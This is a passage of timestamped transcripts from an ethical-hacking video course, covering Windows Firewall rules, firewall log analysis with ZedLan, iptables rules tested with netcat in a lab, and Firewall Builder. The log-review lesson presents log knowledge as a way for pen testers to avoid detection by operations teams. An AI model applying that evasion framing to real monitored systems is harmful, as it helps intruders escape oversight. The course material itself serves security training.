> **[6:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=396)** We can see in this window, the defer to user setting and I'll change that to block edge traversal.
>
> **[6:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=403)** Again, I'll apply the change.
>
> **[6:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=410)** I'll do the same with the second rule and click on the properties control and enter 10.0.2.24.
>
> **[7:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=427)** Again, I'll apply the change.
>
> **[7:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=432)** Okay, let's see what effect these changes make.
>
> **[7:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=438)** Okay, let's set up the netcat listener again and I'll now try to connect from Kali.
>
> **[7:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=450)** We get the response as expected.
>
> **[7:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=453)** I'll now try to connect from my ubuntu system.
>
> **[7:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=459)** I can see I'm on IP address 10.0.2.12.
>
> **[7:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=467)** Back in Windows, we can see that the message was not allowed through.
>
> **[7:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=471)** Windows Firewall is now restricting connections based on the IP address the connection is coming from.
>
> **[7:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=477)** The monitoring link provides an information screen showing the profile details and in the logging settings section, a link to the logging file.
>
> **[8:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=487)** I'll click on this and we can see the log entries displayed in notepad.
>
> **[8:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=492)** We can see that the attempted connection from 10.0.2.12 was dropped.

> [!info]- Semantic Content
>
> **Code Keywords:** let (7), public (3), switch (3), private (1), from. (1)
> **UI Navigation:** click on (6), select the (2), switch to (1)
> **Versions:** 10.0.2 (4), 10.0.1 (1), 2.24 (1)
> **Prerequisites:** set up (4), configure (1)
> **Tools:** terminal (2), command prompt (1)
> **CLI Commands:** make (1)
> **Env Vars:** udp (1)
> **Cross-References:** go back to (1)

#### Review firewall logs
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=0)** - [Instructor] The Windows Firewall maintains a log of all allowed and blocked connections but this can become quite a large text file which is somewhat difficult to use.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=10)** The ZedLan analyzer for Windows Firewall logs provides a more manageable interface for log viewing and analysis.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=18)** It's available as a free download from the MoonPoint site shown here.
>
> **[0:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=23)** I've already installed this on my computer so I'll get straight into it.
>
> **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=28)** I'm running it as Administrator as I need to access system space to get the logs.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=34)** ZedLan needs to be configured before we can use it.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=37)** Let's do that now by clicking the link in the middle of the screen.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=41)** We need to specify where our log files are and ZedLan pops up a window to ask us to enter the location or to let ZedLan automatically detect it.
>
> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=50)** I'll close this alert and look for the log files manually.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=53)** I'll press the Browse button and navigate to Windows system 32 log files firewall and I'll select the pfirewall file.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=62)** If the Lookup Hostnames checkbox is set, ZedLan will do a hostname lookup for every IP address we have in the log file.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=70)** This takes a little time but it can be useful for making sense of the log entries.
>
> **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=75)** The Continuous Refresh setting is useful if we want to maintain a real-time display of logging.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=80)** ZedLan allows some protocols and packets to be excluded from the analysis.
>
> **[1:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=85)** For example, we could just analyze TCP packets received by selecting TCP and Receive.
>
> **[1:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=91)** It also allows some actions to be excluded.
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=94)** Here I'm excluding the firewall logs marked as INFO-EVENTS-LOST, as this is just the firewall warning entry.
>
> **[1:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=101)** There are some common packets which occur a lot and are associated with network management and these can be excluded to reduce the amount of unnecessary information to review.
>
> **[1:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=110)** The Save Panel Positions will make sure panels are displayed in their last position.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=115)** The Services and Protocols tabs show the descriptions of common port and protocol numbers and provide a handy reference for packet analysis.
>
> **[2:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=124)** Okay, we can close the Settings window and select File Run, or just press F5 to start the analysis.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=132)** After a few seconds the analyzed data will be displayed.
>
> **[2:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=136)** The individual log entries are shown in the top panel, formatted for easy reading.
>
> **[2:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=140)** Each log entry has a datetime stamp and the action indicates whether the firewall blocked or allowed the packet through.
>
> **[2:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=147)** The protocol and the source and destination IP address and port are shown.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=152)** The packet size and various flag fields are shown including whether this packet was sent or received.
>
> **[2:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=158)** Below the log entry, ZedLan provides its analysis of the logs by port, by source IP, by conversation, and by IP protocol.
>
> **[2:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=168)** The pie charts in the lower panel graphically highlight these summaries.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=172)** To finish our look at ZedLan, let's go back and click on Edit Suggestions.
>
> **[2:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=176)** We can see ZedLan has analyzed the log files and made a number of suggestions about our configuration based on the traffic it's seen and known malware behavior.
>
> **[3:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=185)** As a pen tester, this is an area we don't want the operations team to see our testing activity.
>
> **[3:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=191)** So that completes our brief look at simple log analysis and by understanding what constitutes anomalous activity, we can avoid detection when testing.

> [!info]- Semantic Content
>
> **Env Vars:** tcp (2), info (1), events (1), lost (1)
> **Code Keywords:** let (3), interface (1)
> **UI Navigation:** navigate to (1), select the (1), checkbox (1), click on (1)
> **CLI Commands:** make (1)
> **Definitions:** is an  (1)
> **Analogies:** for example (1)
> **Warnings:** warning (1)
> **Speakers:** - [instructor] (1)

#### Understand Linux IPTables
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=0)** - [Narrator] Linux provides basic firewall capability through the use of a program called iptables.
>
> **[0:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=6)** Iptables is one of the set of rule based firewall modules in Linux, the other being ip6tables, arptables, and ebtables.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=15)** Let's check what rules we have set up in the iptables firewall in our Ubuntu system.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=24)** The command my minus L tells iptables to list its rules.
>
> **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=28)** The minus n switch requests numeric format, the minus v means verbose, so we get as much information as possible.
>
> **[0:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=35)** We can see that there are three sections listed, all with no entries.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=39)** These are called the input, forward, and output chains.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=42)** The input chain contains the rules controlling what addresses and ports can be used for data coming into the computer.
>
> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=49)** This provides protection against a botnet or a hacker trying to break in.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=53)** The forward chain provides rules telling iptables to take data coming in and pass it straight through to output on an outgoing address and port.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=62)** This is used when we're just switching traffic.
>
> **[1:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=65)** The output chain has rules controlling what addresses and ports data can be sent to.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=70)** By controlling the output path through traffic, we can make it more difficult for an infection or unwanted program to send information from our computer out to its collection point.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=80)** Let's check our IP address.
>
> **[1:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=83)** Okay, we can see our IP address is 10.0.2.19.
>
> **[1:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=88)** I'll demonstrate the use of firewall rules by setting up a netcat listener.
>
> **[1:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=93)** Netcat is now listening for data to come in on port 4545.
>
> **[1:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=99)** I'll use Kali to connect to the Ubuntu listener by setting up a sender and entering some text.
>
> **[1:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=109)** And we can see the same text has appeared in Ubuntu.
>
> **[1:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=112)** Okay, I'll press Control + C to terminate the network connection.
>
> **[1:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=116)** Let's now see how we setup firewall rules using iptables.
>
> **[2:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=121)** Firstly we'll set up a rule to block anything coming in from Kali.
>
> **[2:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=124)** I'll enter sudo iptables minus a input, minus s
>
> **[2:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=133)** 10.0.2.4 minus J drop.
>
> **[2:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=139)** The minus a input command means the rule is appended to the end of the current set of rules on the input chain.
>
> **[2:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=145)** Minus s 10.0.2.4 specifies the source address for the rule, which is our Kali system.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=152)** Minus j drop specifies that the action is to drop incoming packets from the specified IP address.
>
> **[2:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=159)** I'll set up the listener and run the netcat test again.
>
> **[2:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=165)** Now nothing is displayed in Ubuntu.
>
> **[2:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=167)** The message has been dropped.
>
> **[2:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=169)** Iptables also allows us to block connections based on the requested port number.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=173)** I can block port 4545 by replacing the rule I just entered using the minus R command with a less restrictive one.
>
> **[3:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=181)** I'll enter sudo iptables minus R input one minus s
>
> **[3:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=192)** 10.0.2.4 minus p TCP minus minus dport 4545
>
> **[3:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=201)** minus J drop.
>
> **[3:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=204)** This command replaces the existing rule along with a new rule to drop any TCP traffic from Kali which tries to connect to port 4545.
>
> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=212)** Let's check our rules again by typing sudo iptables minus L minus n minus v.
>
> **[3:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=223)** There we go.
>
> **[3:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=224)** I'll setup the netcat sender and listener once again.
>
> **[3:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=228)** And nothing appears at the listener.
>
> **[3:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=230)** As before, we're blocked.
>
> **[3:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=232)** However, let's do that again using port 4546.
>
> **[4:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=242)** And we can see this gets through to the listener.
>
> **[4:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=244)** Let's clean up and remove the rule that's currently in by using the minus D command.

> [!info]- Semantic Content
>
> **Code Keywords:** let (6), switch (1), pass (1)
> **Prerequisites:** set up (3), setup (2)
> **CLI Commands:** sudo (3), make (1)
> **Ports:** port 4545 (3), port 4546 (1)
> **Versions:** 10.0.2 (4)
> **Env Vars:** tcp (2)
> **Speakers:** - [narrator] (1)

#### Set up an IPTables firewall
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=0)** - [Instructor] The power of IP tables enables the deployment of quite capable Linux firewall appliances.
>
> **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=7)** While developing a fully configured Linux firewall is out of scope for this course, it is useful to understand how this is done to support testing of such devices.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=16)** We'll set up a firewall which will block all incoming connections except for web from anywhere and SSH management connections from our local network.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=26)** We'll also add some flood protection on incoming web traffic and limit the number of concurrent SSH sessions per user.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=33)** We'll divert any Telnet connections to a honeypot on 10.0.2.199.
>
> **[0:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=39)** We'll also keep a log of dropped connections so we can analyze attack attempts.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=44)** Okay, let's start by setting up remote management.
>
> **[0:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=48)** We limit access to the local network and limit the number of concurrent connections.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=60)** Now we'll allow HTTP and HTTPS access port 80 and 443 but we'll limit the traffic rate.
>
> **[1:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=71)** We'll divert Telnet traffic to the honeypot.
>
> **[1:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=77)** We'll log any dropped packets.
>
> **[1:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=83)** And finally, we'll block any other input.
>
> **[1:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=89)** Okay, let's take a look at the configuration now.
>
> **[1:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=96)** We also need to check the nat table.
>
> **[1:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=102)** Okay, to test this real set, I'll set up a nat count listener on port 443 and send a message from Kali.
>
> **[1:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=109)** For ports below 1024, we'll need to use sudo.
>
> **[2:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=120)** The message is displayed so port 443 connections are allowed through the firewall.
>
> **[2:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=125)** Let's do that again using port 4545.
>
> **[2:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=134)** This time nothing is displayed indicating the port is being blocked.
>
> **[2:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=138)** We can set up a management connection on port 22
>
> **[2:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=147)** and we can see that this is allowed.
>
> **[2:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=149)** We can check the file var/log/kern.log to see what packets have been dropped and we can see at the very bottom two IPT block entries.
>
> **[2:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=162)** This minimal example is a useful basis for experimenting with IP tables and understanding for testing how they might be used or misused.

> [!info]- Semantic Content
>
> **Code Keywords:** let (3), finally, (1), var (1)
> **Ports:** port 443 (2), port 80 (1), port 4545 (1), port 22 (1)
> **Env Vars:** ssh (2), http (1), https (1), ipt (1)
> **CLI Commands:** ssh (2), sudo (1)
> **Prerequisites:** set up (3)
> **Versions:** 10.0.2 (1)
> **Definitions:** is a  (1)
> **Speakers:** - [instructor] (1)

#### Manage rules with Firewall Builder
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980)

> [!transcript]- Transcript
>
> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=1)** - [Instructor] It's not unusual in modern networks for firewalls to accumulate vast numbers of rules, and being able to have a way to document and manage these rules is important for network and security administrators.
>
> **[0:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=14)** Firewall Builder makes it easier to manage firewall rules.
>
> **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=18)** It doesn't change the way in which the firewall operates, but it does provide a simple way of expressing rules to make it much easier to understand them.
>
> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=27)** It supports a range of Linux and Cisco firewall platforms and provides a validation function to check for invalid rules, and issues such as rule shadowing, where a rule will never be executed due to a prior rule.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=41)** Part of the pen tester's role is to check firewall rule sets and determine whether they provide open pathways to a target network.
>
> **[0:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=49)** Even if the firewall isn't currently being managed using Firewall Builder existing rule sets can be imported to allow validation and review more effectively than at the command line.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=62)** Firewall Builder can be downloaded from the SourceForge website shown here.
>
> **[1:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=67)** I've downloaded and installed Firewall Builder.
>
> **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=70)** So, let's use it to create a firewall rule set.
>
> **[1:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=73)** When starting up Firewall Builder we have three icons to choose from, Create new firewall, Import existing configuration, and Watch the Getting Started Tutorial.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=84)** On the left hand object panel we can see a Filter and drop-down Library box.
>
> **[1:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=88)** This enables either the User, or the Standard library of objects, and below that is the library tree, which contains the items Clusters, Firewalls, Objects, Services, and Time.
>
> **[1:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=101)** When I open Objects I can see this allows Address Ranges, DNS Names, Hosts, and Networks, and other similar objects to be defined, which can then be included as source and destinations for the firewall rules we'll build.
>
> **[1:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=115)** Similarly, when I open the Services entry I can see the various services we can define to support service names as port aliases.
>
> **[2:05](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=125)** There's also a menu at the top, and if we look at Edit the bottom item in the list is Preferences.
>
> **[2:11](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=131)** I'll select that.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=132)** There are seven preference tables providing the ability to customize the application.
>
> **[2:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=137)** Of particular interest is the right hand tab which shows the list of firewalls and hosts which are supported by Firewall Builder, and enables them to be switched on or off as required.
>
> **[2:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=148)** Another interesting menu item is the bottom item under Tools, which allows Firewall Builder's built in SNMP crawler to discover hosts on the local network.
>
> **[2:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=159)** This can be useful when testing to confirm that all connected devices are known.
>
> **[2:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=164)** In Firewall Builder, each firewall object has several sets of rules associated with it, access policy rules, network address translation rules, and routing rules.
>
> **[2:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=175)** Access policy rules filter traffic, controlling access to and from the firewall and the network behind it.
>
> **[3:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=182)** NAT rules describe address and port transformations that the firewall should make to packets flowing through it, and routing rules establish static routes in the firewall.
>
> **[3:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=192)** Firewall Builder accounts for variations in the way firewalls are specified by using a common standard.
>
> **[3:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=199)** For example, NAT rules are written in (mumbles), as if the translation happens before the access rules are applied, regardless of the firewall type.
>
